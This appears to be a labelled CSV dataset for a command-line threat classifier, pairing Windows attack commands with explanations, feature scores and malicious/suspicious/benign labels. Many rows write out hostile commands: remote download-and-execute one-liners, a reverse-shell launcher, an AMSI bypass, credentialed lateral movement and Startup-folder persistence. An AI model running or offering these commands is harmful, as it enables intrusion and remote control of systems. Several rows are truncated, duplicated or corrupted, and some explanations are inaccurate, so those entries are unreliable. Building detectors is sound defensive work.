prompt,response,Lolbin (0.05),Content (0.4),Frequency (0.2),Source (0.1),Network (0.1),Behavioural (0.1),History (0.05),Score,Label
"winrm invoke Create wmicimv2/Win32_Process @{CommandLine=""notepad.exe""} -r:http://target:5985","This command can be used to remotely create a process (in this case, notepad.exe) on a target machine using Windows Remote Management (WinRM).",winrm,notepad.exe,none,http://target:5985,target:5985,"Create,-r",none,0.75,malicious
%SystemDrive%\\BypassDir\\cscript //nologo %windir%\\System32\\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty,"This command can be used to bypass Windows Defender and execute malicious code through Windows Remote Management (WinRM) by retrieving the process handle of a legitimate process (in this case, Handle 4) and injecting malicious code into it.",winrm.vbs, %windir%\\System32\\winrm.vbs,none,%SystemDrive%\\BypassDir\\cscript,none,get,none,0.65,malicious
"Pester.bat [/help|?|-?|/?] ""$null; notepad""","This command can be used to execute a PowerShell script that can be used to download and execute malicious code, while also opening a decoy notepad window to avoid suspicion.",Pester.bat,notepad,none,none,none,"/help,?,-?,/?",none,0.55,suspicious
"C:\Python27\python.exe -c ""(lambda __y",This is an incomplete command and cannot be used for any purpose.,none,lambda,none,C:\Python27\python.exe,none,-c,none,0.6,malicious
"C:\Python27\python.exe -c ""(lambda __y",This command executes a Python script and could potentially be used to run malicious Python code on a Windows machine.,none,lambda,none,C:\Python27\python.exe,none,-c,none,0.6,malicious
"ruby -rsocket -e 'c=TCPSocket.new(""10.0.0.1""","This command opens a TCP socket to IP address 10.0.0.1 using the Ruby programming language, which could potentially be used to establish a remote connection to a target machine for further exploitation or data exfiltration.",none,none,none,none,10.0.0.1,"-rsocket,-e,TCPSocket.new",none,0.25,suspicious
"ruby -rsocket -e 'c=TCPSocket.new(""11.0.0.1""","This command opens a TCP socket to IP address 11.0.0.1 using the Ruby programming language, which could potentially be used to establish a remote connection to a command and control server for data exfiltration or further exploitation.",none,none,none,none,11.0.0.1,"-rsocket,-e,TCPSocket.new",none,0.25,suspicious
lua5.1 -e 'local host,"This command executes a Lua script on the machine, which could potentially be used to run malicious code or commands.",lua5.1,none,none,none,localhost,#NAME?,none,0.25,suspicious
lua5.1 -e 'local host,"This command executes a Lua script on the machine, which could potentially be used to run malicious code or commands.",lua5.1,none,none,none,localhost,#NAME?,none,0.25,suspicious
powershell IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001,"This command downloads and executes a PowerShell script from a remote GitHub repository, which establishes a reverse shell to a specified IP address and port. It can be used by an attacker to gain remote access to a compromised Windows machine.",powershell,https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1,none,https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1,"10.0.0.2,3001",Invoke-ConPtyShell,none,0.75,malicious
powershell IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 11.0.0.2 3001,"This command downloads and executes a PowerShell script from a GitHub repository, which establishes a reverse shell to a specified IP address and port. It can be used for remote access and control of a compromised Windows machine.",powershell,https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1,none,https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1,"11.0.0.2,3001",Invoke-ConPtyShell,none,0.75,malicious
psexec \\test.domain -u Domain\User -p Password ipconfig,"This command can be used to remotely execute ipconfig on a target machine using psexec, which can be useful for gathering network information during a cyberattack.",none,none,none,none,test.domain,ipconfig,none,0.2,suspicious
psexec \\10.10.10.10 -u Domain\User -p Password ipconfig,"This command can be used to remotely execute ipconfig on a target machine using psexec, which can be useful for gathering network information during a cyberattack.",none,none,none,none,10.10.10.10,ipconfig,none,0.3,suspicious
sc \\host.domain create ExampleService binpath= â€œc:\windows\system32\calc.exeâ€,"This command can be used to create a new service on a remote machine and set its binary path to execute a malicious program (in this case, the calculator).",sc,c:\windows\system32\calc.exe,none,c:\windows\system32\calc.exe,host.domain,create,none,0.75,malicious
sc \\10.10.10.10 create ExampleService binpath= â€œc:\windows\system32\calc.exeâ€,This command can be used to create a new service on a remote machine and set its binary path to execute a malicious executable such as a backdoor or a keylogger.,sc,c:\windows\system32\calc.exe,none,c:\windows\system32\calc.exe,10.10.10.10,create,none,0.75,malicious
sc \\10.10.10.10 start ExampleService,"This command can be used to start a service named ExampleService on a remote machine with IP address 10.10.10.10, which can be useful for executing malicious code or maintaining persistence on a compromised machine.",sc,ExampleService,none,none,10.10.10.10,start,none,0.65,malicious
sc \\host.domain start ExampleService,"Potential use in a cyberattack: Starting a service on a remote machine to establish persistence or execute malicious code.
What it might do on a Windows machine: Starts the ExampleService on the remote machine specified by the host.domain parameter.",sc,ExampleService,none,none,host.domain,start,none,0.65,malicious
"wmic /node:target.domain /user:domain\user /password:password process call create ""C:\Windows\System32\calc.exeâ€","This command can be used to remotely execute the Windows calculator on a target machine using the Windows Management Instrumentation Command-line (WMIC) tool, which can be useful for lateral movement and privilege escalation.",wmic,C:\Windows\System32\calc.exe,none,C:\Windows\System32\calc.exe,target.domain,create,none,0.75,malicious
"wmic /node:10.10.10.10 /user:domain\user /password:password process call create ""C:\Windows\System32\calc.exeâ€",This command can be used to remotely execute the Windows calculator application on a specified machine using valid credentials. It can be used in a cyberattack to test for successful lateral movement and privilege escalation.,wmic,C:\Windows\System32\calc.exe,none,C:\Windows\System32\calc.exe,10.10.10.10,create,none,0.75,malicious
winrs -r:EXAMPLE.lab.local -u:DOMAIN\user -p:password calc.exe,"This command can be used to remotely execute the Windows calculator on a machine in the EXAMPLE.lab.local domain using the specified user credentials, potentially allowing an attacker to gain access to sensitive information or execute further commands on the compromised machine.",none,calc.exe,none,none,none,-r,none,0.5,suspicious
winrs -r:10.10.10.10 -u:DOMAIN\user -p:password calc.exe,"This command can be used to remotely execute the Windows calculator on a machine with IP address 10.10.10.10 using the specified user credentials, which could potentially be used in a cyberattack for lateral movement or privilege escalation.",none,calc.exe,none,none,10.10.10.10,-r,none,0.6,malicious
schtasks /create /tn ExampleTask /tr c:\windows\system32\calc.exe /sc once /st 00:00 /S host.domain /RU System,"This command can be used to create a scheduled task that runs the calculator program once at midnight using the System account, which can be used to execute malicious code or commands on a compromised machine.",schtasks,ExampleTask,none,c:\windows\system32\calc.exe,host.domain,"/create,/tn,/tr,/sc,/st,/s,/RU",none,0.75,malicious
schtasks /run /tn ExampleTask /S host.domain,"This command can be used to execute a scheduled task remotely on a Windows machine, which can be useful for executing malicious code or commands on a compromised system.",schtasks,ExampleTask,none,host.domain,host.domain,"/run,/tn,/s",none,0.75,malicious
schtasks /run /tn ExampleTask /S 10.10.10.10,"This command can be used to remotely execute a scheduled task on a Windows machine with IP address 10.10.10.10, which could potentially be used in a cyberattack for persistence or to execute malicious code on the target machine.",schtasks,ExampleTask,none,10.10.10.10,10.10.10.10,"/run,/tn,/s",none,0.75,malicious
schtasks /F /delete /tn ExampleTask /S host.domain,"This command can be used to delete a scheduled task remotely on a Windows machine, which can be useful for removing persistence mechanisms or disabling automated tasks set up by an attacker.",schtasks,ExampleTask,none,host.domain,host.domain,"/F,/delete,/tn,/S",none,0.75,malicious
schtasks /F /delete /tn ExampleTask /S 10.10.10.10,"This command can be used to delete a scheduled task remotely on a Windows machine, potentially to remove a persistence mechanism or disable a scheduled malware execution.",schtasks,ExampleTask,none,10.10.10.10,10.10.10.10,"/F,/delete,/tn,/S",none,0.75,malicious
MSBuild.exe \\host.domain\path\to\XMLfile.xml,"This command can be used to execute an XML file containing MSBuild instructions, which can be used to build and compile code, potentially allowing an attacker to execute malicious code on the target machine.",MSBuild.exe,\\host.domain\path\to\XMLfile.xml,none,\\host.domain\path\to\XMLfile.xml,none,none,none,0.55,suspicious
MSBuild.exe \\10.10.10.10\path\to\XMLfile.xml,"This command can be used to execute an XML file as a build script, which can be abused to execute arbitrary code or commands on a target machine.",MSBuild.exe,\\10.10.10.10\path\to\XMLfile.xml,none,\\10.10.10.10\path\to\XMLfile.xml,10.10.10.10,none,none,0.65,suspicious
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe \\host.domain\path\to\XMLfile.xml,"This command can be used to execute an XML file on a remote host, potentially allowing an attacker to execute arbitrary code on the target machine.",MSBuild.exe,\\host.domain\path\to\XMLfile.xml,none,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe,none,none,none,0.55,suspicious
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe \\10.10.10.10\path\to\XMLfile.xml,"This command can be used to execute an XML file remotely, potentially allowing an attacker to execute malicious code on the target machine.",MSBuild.exe,\\10.10.10.10\path\to\XMLfile.xml,none,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe,10.10.10.10,none,none,0.65,suspicious
"wmic /node:LABWIN10.lab.local /user:LAB\Administrator /password:Password! process call create ""c:\windows\Microsoft.NET\Framework\v4.0.30319\Msbuild.exe \\LAB2012DC01.LAB.local\C$\Windows\Temp\build.xml""","This command can be used to remotely execute a malicious payload (in this case, a build.xml file) on a Windows machine using the Windows Management Instrumentation Command-line (WMIC) tool.",wmic,\\LAB2012DC01.LAB.local\C$\Windows\Temp\build.xml,none,LABWIN10.lab.local,none,create,none,0.65,suspicious
"wmic /node:10.10.10.10 /user:LAB\Administrator /password:Password! process call create ""c:\windows\Microsoft.NET\Framework\v4.0.30319\Msbuild.exe \\10.10.10.10\C$\Windows\Temp\build.xml""","This command can be used to remotely execute a malicious payload (in this case, a build.xml file) on a target machine using the Windows Management Instrumentation Command-line (WMIC) tool.",wmic,\\10.10.10.10\C$\Windows\Temp\build.xml,none,10.10.10.10,10.10.10.10,create,none,0.75,malicious
copy C:\Users\Administrator\Downloads\build.xml \\10.10.10.10\C$\Windows\Temp\,"This command can be used to copy a file from the local machine to a remote machine, potentially allowing an attacker to move malicious files onto a target machine for execution.",none,\\10.10.10.10\C$\Windows\Temp\,none,C:\Users\Administrator\Downloads\build.xml,10.10.10.10,copy,none,0.7,malicious
"wmic /node:LABWIN10.lab.local /user:LAB\Administrator /password:Password! process call create ""c:\windows\Microsoft.NET\Framework\v4.0.30319\Msbuild.exe C:\Windows\Temp\build.xml""","This command can be used to remotely execute a malicious payload (in this case, a build.xml file) on a Windows machine using the Windows Management Instrumentation Command-line (WMIC) tool.",wmic,C:\Windows\Temp\build.xml,none,LABWIN10.lab.local,none,create,none,0.65,suspicious
"wmic /node:10.10.10.10 /user:LAB\Administrator /password:Password! process call create ""c:\windows\Microsoft.NET\Framework\v4.0.30319\Msbuild.exe C:\Windows\Temp\build.xml""","This command can be used to remotely execute a malicious payload (in this case, Msbuild.exe) on a target machine (10.10.10.10) using stolen credentials (LAB\Administrator) and create a new process (build.xml) in a temporary directory.",wmic,C:\Windows\Temp\build.xml,none,10.10.10.10,10.10.10.10,create,none,0.75,malicious
"psexec \\host.domain -u Domain\Tester -p Passw0rd c:\windows\Microsoft.NET\Framework\v4.0.30319\Msbuild.exe \\host.domain\C$\Windows\Temp\build.xml""","This command can be used to remotely execute Msbuild.exe on a target machine, potentially allowing an attacker to build and execute malicious code on the target machine.",Msbuild.exe,\\host.domain\C$\Windows\Temp\build.xml,none,c:\windows\Microsoft.NET\Framework\v4.0.30319\Msbuild.exe,host.domain,psexec,none,0.75,malicious
"psexec \\10.10.10.10 -u Domain\Tester -p Passw0rd c:\windows\Microsoft.NET\Framework\v4.0.30319\Msbuild.exe \\10.10.10.10\C$\Windows\Temp\build.xml""","This command can be used to remotely execute Msbuild.exe on a target machine, potentially allowing an attacker to build and execute malicious code on the target machine.",Msbuild.exe, \\10.10.10.10\C$\Windows\Temp\build.xml,none,c:\windows\Microsoft.NET\Framework\v4.0.30319\Msbuild.exe,10.10.10.10,psexec,none,0.75,malicious
"powershell [System.Activator]::CreateInstance([type]::GetTypeFromProgID(""MMC20.Application""","This command can be used to launch the Microsoft Management Console (MMC) on a Windows machine, which can be used to manage various aspects of the system, including services, event logs, and certificates. In a cyberattack, this command could be used to gain access to sensitive information or to modify system settings.",powershell,MMC20.Application,none,none,none,CreateInstance,none,0.55,suspicious
"powershell [System.Activator]::CreateInstance([type]::GetTypeFromProgID(""MMC20.Application""","This command can be used to launch the Microsoft Management Console (MMC) on a Windows machine, which can be used to manage various system settings and configurations, and could potentially be used by an attacker to gain further access or control over the system.",powershell,MMC20.Application,none,none,none,CreateInstance,none,0.55,suspicious
copy C:\Windows\Temp\Malice.exe \\10.10.10.10\C$\Windows\Temp,"This command can be used to copy a malicious executable file to a remote machine's temporary folder, allowing for remote execution of the malware.",none,\\10.10.10.10\C$\Windows\Temp,none,C:\Windows\Temp\Malice.exe,10.10.10.10,copy,none,0.7,malicious
"wmic /node:target.domain /user:domain\user /password:password process call create ""C:\Windows\Temp\Malice.exeâ€",This command can be used to remotely execute a malicious executable file on a target machine using valid credentials.,wmic,C:\Windows\Temp\Malice.exe,none,C:\Windows\Temp\Malice.exe,target.domain,create,none,0.85,malicious
"wmic /node:10.10.10.10 /user:domain\user /password:password process call create ""C:\Windows\Temp\Malice.exeâ€",This command can be used to remotely execute a malicious executable file on a target machine using Windows Management Instrumentation Command-line (WMIC) and can be used for lateral movement or to establish persistence on the target machine.,wmic,C:\Windows\Temp\Malice.exe,none,C:\Windows\Temp\Malice.exe,10.10.10.10,create,none,0.85,malicious
mshta.exe http://malicious.domain/runme.hta,"This command can be used to execute a malicious HTA file from a remote server, potentially allowing an attacker to download and execute additional malware on the compromised system.",mshta.exe,http://malicious.domain/runme.hta,none,http://malicious.domain/runme.hta,none,none,none,0.55,suspicious
mshta.exe http://11.10.10.10/runme.hta,"This command can be used to execute a malicious HTA file hosted on a remote server, potentially allowing an attacker to download and execute additional malware on the victim's machine.",mshta.exe,http://11.10.10.10/runme.hta,none,http://11.10.10.10/runme.hta,11.10.10.10,none,none,0.65,malicious
mshta.exe http://10.10.10.10/runme.hta,"This command can be used to execute a malicious HTA file hosted on a remote server, allowing an attacker to run arbitrary code on the victim's machine.",mshta.exe,http://10.10.10.10/runme.hta,none,http://10.10.10.10/runme.hta,10.10.10.10,none,none,0.65,malicious
"rundll32.exe javascript:""..\mshtml",This command can be used to execute arbitrary JavaScript code and potentially download and execute additional malware on a Windows machine.,rundll32.exe,..\mshtml,none,javascript,none,none,none,0.55,suspicious
"rundll32.exe javascript:""..\mshtml",This command can be used to execute arbitrary JavaScript code and potentially download and execute additional malware on a Windows machine.,rundll32.exe,..\mshtml,none,javascript,none,none,none,0.55,suspicious
rundll32.exe url.dll,"Can be used to launch a URL or execute a DLL file, potentially used to download and execute malicious code.",rundll32.exe,url.dll,none,url.dll,none,none,none,0.55,suspicious
regsvr32 /s /n /u /i:http://server/file.sct scrobj.dll,"This command can be used to execute a malicious script hosted on a remote server and load it into the scrobj.dll library, potentially allowing an attacker to gain remote access to the system.",regsvr32,scrobj.dll,none,http://server/file.sct,none,"/s,/n,/u,/i",none,0.65,malicious
regsvr32 /s /n /u /i:http://11.12.13.14/file.sct scrobj.dll,"This command can be used to execute a malicious script hosted on a remote server and register a DLL file, potentially allowing for persistence and remote access to the compromised machine.",regsvr32,scrobj.dll,none,http://11.12.13.14/file.sct,11.12.13.14,"/s,/n,/u,/i",none,0.75,malicious
regsvr32 /s /n /u /i:http://10.12.13.14/file.sct scrobj.dll,"This command can be used to execute a malicious script hosted on a remote server and register a DLL file, potentially allowing an attacker to gain persistence on the compromised system and execute further malicious actions.",regsvr32,scrobj.dll,none,http://10.12.13.14/file.sct,10.12.13.14,"/s,/n,/u,/i",none,0.75,malicious
powershell [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed',"This command can be used to check if the Anti-Malware Scan Interface (AMSI) is disabled on a Windows machine, which can be useful for bypassing antivirus detection during a cyberattack.",powershell,amsiInitFailed,none,System.Management.Automation.AmsiUtils,none,"GetType,GetField",none,0.65,malicious
"powershell [Delegate]::CreateDelegate((""Func``3[String","This command can be used to create a delegate function in PowerShell, which can be used to execute arbitrary code and potentially bypass security measures on a Windows machine.",powershell,Func``3[String,none,none,none,CreateDelegate,none,0.55,suspicious
powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.7/PowerView.obs.ps1'),"This command downloads and executes a PowerShell script from a remote server, which could be used to perform various actions on the compromised machine or network.",powershell,http://10.10.16.7/PowerView.obs.ps1,none,http://10.10.16.7/PowerView.obs.ps1,10.10.16.7,.DownloadString,none,0.75,malicious
powershell IEX (New-Object Net.WebClient).DownloadString('http://11.10.16.7/PowerView.obs.ps1'),"This command downloads and executes a PowerShell script from a remote server, which could be used to perform various actions on the compromised machine, such as reconnaissance, privilege escalation, or lateral movement.",powershell,http://11.10.16.7/PowerView.obs.ps1,none,http://11.10.16.7/PowerView.obs.ps1,11.10.16.7,.DownloadString,none,0.75,malicious
powershell $h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET',"This command can be used to send a GET request to a web server and retrieve data, which can be used to exfiltrate sensitive information from a compromised machine.",powershell,WinHttp.WinHttpRequest.5.1,none,none,none,"new-object,-com,GET",none,0.55,suspicious
powershell $h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET',"This command can be used to send a GET request to a web server and retrieve data, which can be used to exfiltrate sensitive information from a compromised machine.",powershell,WinHttp.WinHttpRequest.5.1,none,none,none,"new-object,-com,GET",none,0.55,suspicious
"powershell (New-Object System.Net.WebClient).DownloadFile(""http://192.168.119.155/PowerUp.ps1""","This command downloads a PowerShell script from a remote server, which could be used to execute malicious code on the target machine.",powershell,New-Object System.Net.WebClient,none,http://192.168.119.155/PowerUp.ps1,192.168.119.155,.DownloadFile,none,0.75,malicious
"powershell (New-Object System.Net.WebClient).DownloadFile(""http://193.168.119.155/PowerUp.ps1""","This command downloads a PowerShell script from a remote server, which could be used to execute malicious code on the victim machine.",powershell,New-Object System.Net.WebClient,none,http://193.168.119.155/PowerUp.ps1,193.168.119.155,.DownloadFile,none,0.75,malicious
"powershell Invoke-WebRequest ""http://10.10.16.7/Rev.exe"" -OutFile ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Rev.exe""","This command downloads a file from a remote server and saves it to the Windows startup folder, potentially allowing for persistence and remote access to the compromised machine.",powershell,C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Rev.exe,none,http://10.10.16.7/Rev.exe,10.10.16.7,"Invoke-WebRequest,-OutFile",none,0.75,malicious
"powershell Invoke-WebRequest ""http://11.10.16.7/Rev.exe"" -OutFile ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Rev.exe""","This command downloads a file from a remote server and saves it to the Windows startup folder, allowing it to execute every time the machine is restarted, potentially allowing for persistent access and control of the machine.",powershell,C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Rev.exe,none,http://11.10.16.7/Rev.exe,11.10.16.7,"Invoke-WebRequest,-OutFile",none,0.75,malicious
powershell $bytes = [System.Text.Encoding]::Unicode.GetBytes($command),"This command encodes a given command in Unicode format and stores it in a variable called $bytes, which could potentially be used to execute malicious code or commands on a Windows machine using PowerShell.",powershell,$command,none,none,none,Unicode.GetBytes,none,0.55,suspicious
powershell $encodedCommand = [Convert]::ToBase64String($bytes),"This command can be used to encode a PowerShell script into base64 format, which can then be executed on a Windows machine without being detected by antivirus software.",powershell,$bytes,none,none,none,ToBase64String,none,0.55,suspicious
powershell Get-DomainUser | select -ExpandProperty cn,"Potential use: Enumeration of domain users.
What it does: Retrieves the common name (cn) property of all domain users.",powershell,none,none,none,none,"Get-DomainUser,select,-ExpandProperty",none,0.15,benign
powershell Get-DomainUser | select -ExpandProperty cn,"Potential use: Enumeration of domain users.
What it does: Retrieves the common name (cn) property of all domain users.",powershell,none,none,none,none,"Get-DomainUser,select,-ExpandProperty",none,0.15,benign
powershell Get-DomainComputer,"Potential use: Enumeration of domain computers.
What it does: Retrieves a list of all computers in the current domain.",powershell,none,none,none,none,Get-DomainComputer,none,0.15,benign
powershell Get-ForestDomain,"Potential use in a cyberattack: Gathering information about the target network's forest domain.

What it might do on a Windows machine: Retrieves information about the forest domain in Active Directory, including the domain name, domain controllers, and trusts.",powershell,none,none,none,none,Get-ForestDomain,none,0.15,benign
powershell Get-DomainTrust,"Potential use: Enumeration of trusted domains in a network for lateral movement.

What it does: Retrieves information about trusts established between the current domain and other domains in the forest.",powershell,none,none,none,none,Get-DomainTrust,none,0.15,benign
powershell Get-ForestTrust,"Potential use in a cyberattack: Gathering information about trusted domains in a forest for lateral movement.

What it might do on a Windows machine: Retrieves information about forest trusts, including the trusted domain name, direction of trust, and trust type.",powershell,none,none,none,none,Get-ForestTrust,none,0.15,benign
